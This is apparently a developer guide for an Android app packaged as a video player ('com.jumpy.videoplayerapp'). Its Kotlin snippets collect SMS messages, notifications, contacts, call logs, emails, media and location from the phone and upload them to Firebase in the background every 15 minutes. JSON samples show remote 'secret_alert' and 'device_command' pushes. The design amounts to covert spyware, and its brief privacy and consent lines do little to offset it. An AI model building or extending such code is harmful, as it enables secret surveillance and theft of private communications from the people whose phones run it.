# 📱 Mobile Firebase Integration Guide

This guide explains how to integrate Firebase directly into your Android mobile app for real-time data synchronization and secret notifications.

## 🚀 **Overview**

The mobile Firebase integration provides:
- **Direct Data Sync**: Real-time synchronization from device to Firebase
- **Push Notifications**: Secret alerts and remote commands
- **Background Sync**: Automatic data collection and upload
- **Offline Support**: Data caching and retry mechanisms
- **Secure Storage**: Encrypted data transmission

## 📋 **Setup Instructions**

### **1. Firebase Project Configuration**

1. Go to [Firebase Console](https://console.firebase.google.com/)
2. Select your project (or create new one)
3. Enable the following services:
   - **Firestore Database**
   - **Realtime Database**
   - **Storage**
   - **Cloud Messaging**
   - **Authentication**

### **2. Android App Configuration**

#### **Add google-services.json**
1. In Firebase Console, go to **Project Settings** > **General**
2. Add your Android app with package name: `com.jumpy.videoplayerapp`
3. Download `google-services.json`
4. Place it in `app/` directory

#### **Update build.gradle**
The dependencies are already added to your `app/build.gradle`:
```gradle
// Firebase SDK
implementation platform('com.google.firebase:firebase-bom:32.7.0')
implementation 'com.google.firebase:firebase-analytics'
implementation 'com.google.firebase:firebase-firestore'
implementation 'com.google.firebase:firebase-database'
implementation 'com.google.firebase:firebase-storage'
implementation 'com.google.firebase:firebase-messaging'
implementation 'com.google.firebase:firebase-auth'
implementation 'com.google.firebase:firebase-config'
```

### **3. Initialize Firebase in Your App**

Add this to your `MainActivity.kt`:

```kotlin
class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        // Initialize Firebase
        initializeFirebase()
    }
    
    private fun initializeFirebase() {
        // Initialize Firebase service
        val firebaseService = FirebaseService.getInstance(this)
        firebaseService.initialize()
        
        // Schedule periodic sync
        FirebaseSyncWorker.schedulePeriodicSync(this)
        
        // Listen for real-time updates
        firebaseService.listenForUpdates { updates ->
            Log.d("MainActivity", "Real-time updates: $updates")
            // Handle updates
        }
    }
}
```

## 🔧 **Usage Examples**

### **Manual Data Sync**

```kotlin
// Sync notifications
val notifications = listOf(
    FirebaseService.NotificationData(
        title = "Test Notification",
        text = "This is a test",
        packageName = "com.test.app",
        timestamp = Date(),
        type = "incoming"
    )
)

lifecycleScope.launch {
    val success = firebaseService.syncNotifications(notifications)
    if (success) {
        Log.d("Sync", "Notifications synced successfully")
    }
}

// Sync messages
val messages = listOf(
    FirebaseService.MessageData(
        address = "+1234567890",
        body = "Test message",
        type = "inbox",
        timestamp = Date()
    )
)

lifecycleScope.launch {
    val success = firebaseService.syncMessages(messages)
    if (success) {
        Log.d("Sync", "Messages synced successfully")
    }
}

// Bulk sync all data
val bulkData = FirebaseService.BulkSyncData(
    notifications = notifications,
    messages = messages,
    contacts = contacts,
    callLogs = callLogs,
    emails = emails,
    mediaFiles = mediaFiles
)

lifecycleScope.launch {
    val success = firebaseService.bulkSync(bulkData)
    if (success) {
        Log.d("Sync", "Bulk sync completed")
    }
}
```

### **Push Notifications**

The app automatically handles push notifications through `JumpyFirebaseMessagingService`. You can send different types of notifications:

#### **Secret Alert**
```json
{
  "to": "device_fcm_token",
  "data": {
    "type": "secret_alert",
    "title": "Secret Alert",
    "message": "New data available",
    "priority": "high",
    "trigger_sync": "true"
  }
}
```

#### **Sync Request**
```json
{
  "to": "device_fcm_token",
  "data": {
    "type": "sync_request",
    "message": "Sync device data"
  }
}
```

#### **Device Command**
```json
{
  "to": "device_fcm_token",
  "data": {
    "type": "device_command",
    "command": "collect_notifications"
  }
}
```

## 📊 **Data Collection Integration**

### **Notification Collection**

```kotlin
class NotificationCollector {
    private val firebaseService = FirebaseService.getInstance(context)
    
    fun collectAndSyncNotifications() {
        // Collect notifications from your existing service
        val notifications = getNotificationsFromDevice()
        
        // Convert to Firebase format
        val firebaseNotifications = notifications.map { notification ->
            FirebaseService.NotificationData(
                title = notification.title,
                text = notification.text,
                packageName = notification.packageName,
                timestamp = notification.timestamp,
                type = notification.type
            )
        }
        
        // Sync to Firebase
        lifecycleScope.launch {
            firebaseService.syncNotifications(firebaseNotifications)
        }
    }
}
```

### **Message Collection**

```kotlin
class MessageCollector {
    private val firebaseService = FirebaseService.getInstance(context)
    
    fun collectAndSyncMessages() {
        // Collect SMS messages
        val messages = getSMSMessages()
        
        // Convert to Firebase format
        val firebaseMessages = messages.map { message ->
            FirebaseService.MessageData(
                address = message.address,
                body = message.body,
                type = message.type,
                timestamp = message.timestamp
            )
        }
        
        // Sync to Firebase
        lifecycleScope.launch {
            firebaseService.syncMessages(firebaseMessages)
        }
    }
}
```

### **Contact Collection**

```kotlin
class ContactCollector {
    private val firebaseService = FirebaseService.getInstance(context)
    
    fun collectAndSyncContacts() {
        // Collect contacts
        val contacts = getContactsFromDevice()
        
        // Convert to Firebase format
        val firebaseContacts = contacts.map { contact ->
            FirebaseService.ContactData(
                name = contact.name,
                phone = contact.phone,
                email = contact.email
            )
        }
        
        // Sync to Firebase
        lifecycleScope.launch {
            firebaseService.syncContacts(firebaseContacts)
        }
    }
}
```

## 🔄 **Background Sync**

### **Automatic Sync**

The app automatically syncs data every 15 minutes using `FirebaseSyncWorker`. You can control this:

```kotlin
// Start periodic sync
FirebaseSyncWorker.schedulePeriodicSync(context)

// Trigger immediate sync
FirebaseSyncWorker.scheduleOneTimeSync(context)

// Cancel all sync
FirebaseSyncWorker.cancelAllSync(context)
```

### **Custom Sync Intervals**

You can modify the sync interval in `FirebaseSyncWorker.kt`:

```kotlin
val syncRequest = PeriodicWorkRequestBuilder<FirebaseSyncWorker>(
    30, TimeUnit.MINUTES, // Change to 30 minutes
    10, TimeUnit.MINUTES  // Flex period
)
```

## 🔒 **Security Features**

### **Data Encryption**
- All data is encrypted in transit using HTTPS
- Firebase provides automatic encryption at rest
- Device-specific data isolation

### **Authentication**
- Firebase Auth for user authentication
- Device token management
- Secure API access

### **Privacy Controls**
- Device-specific data storage
- User consent management
- Data retention policies

## 📱 **Real-time Features**

### **Live Updates**
```kotlin
firebaseService.listenForUpdates { updates ->
    // Handle real-time updates
    updates.forEach { (key, value) ->
        when (key) {
            "new_command" -> handleNewCommand(value)
            "sync_request" -> triggerSync()
            "alert" -> showAlert(value.toString())
        }
    }
}
```

### **Device Status Monitoring**
The app automatically updates device status:
- Battery level
- Network type
- Location (if available)
- Online/offline status

## 🚨 **Troubleshooting**

### **Common Issues**

1. **Firebase Connection Failed**
   - Check internet connection
   - Verify `google-services.json` is in correct location
   - Check Firebase project configuration

2. **Push Notifications Not Working**
   - Verify FCM token is generated
   - Check notification permissions
   - Test with Firebase Console

3. **Sync Failures**
   - Check network connectivity
   - Verify Firebase rules
   - Check data format

### **Debug Commands**

```kotlin
// Check Firebase connection
FirebaseFirestore.getInstance().collection("test").document("test").get()
    .addOnSuccessListener { Log.d("Firebase", "Connection successful") }
    .addOnFailureListener { Log.e("Firebase", "Connection failed", it) }

// Check FCM token
FirebaseMessaging.getInstance().token
    .addOnSuccessListener { Log.d("FCM", "Token: $it") }
    .addOnFailureListener { Log.e("FCM", "Token failed", it) }
```

## 📈 **Performance Optimization**

### **Batch Operations**
- Use bulk sync for multiple data types
- Implement efficient data collection
- Optimize network requests

### **Caching**
- Cache data locally before sync
- Implement retry mechanisms
- Use offline persistence

### **Memory Management**
- Clear old data periodically
- Optimize image/media uploads
- Monitor memory usage

## 🔧 **Configuration Options**

### **Sync Settings**
```kotlin
// Custom sync intervals
val syncInterval = 15 // minutes
val flexInterval = 5 // minutes

// Retry settings
val maxRetries = 3
val retryDelay = 10 // minutes
```

### **Data Retention**
```kotlin
// Local data retention
val retentionDays = 7
val maxCacheSize = 100 * 1024 * 1024 // 100MB
```

## 📚 **API Reference**

### **FirebaseService Methods**

- `initialize()` - Initialize Firebase service
- `syncNotifications(notifications)` - Sync notifications
- `syncMessages(messages)` - Sync messages
- `syncContacts(contacts)` - Sync contacts
- `syncCallLogs(callLogs)` - Sync call logs
- `syncEmails(emails)` - Sync emails
- `uploadMedia(mediaFiles)` - Upload media files
- `bulkSync(data)` - Bulk sync all data
- `listenForUpdates(callback)` - Listen for real-time updates

### **FirebaseSyncWorker Methods**

- `schedulePeriodicSync(context)` - Schedule periodic sync
- `scheduleOneTimeSync(context)` - Schedule one-time sync
- `cancelAllSync(context)` - Cancel all sync work

## 🆘 **Support**

For issues and questions:
1. Check Firebase Console logs
2. Review Android logs with `adb logcat`
3. Test with Firebase Console
4. Verify network connectivity
5. Check Firebase project settings

---

**⚠️ Important**: This integration is designed for secure data collection and monitoring. Ensure compliance with privacy laws and regulations in your jurisdiction. 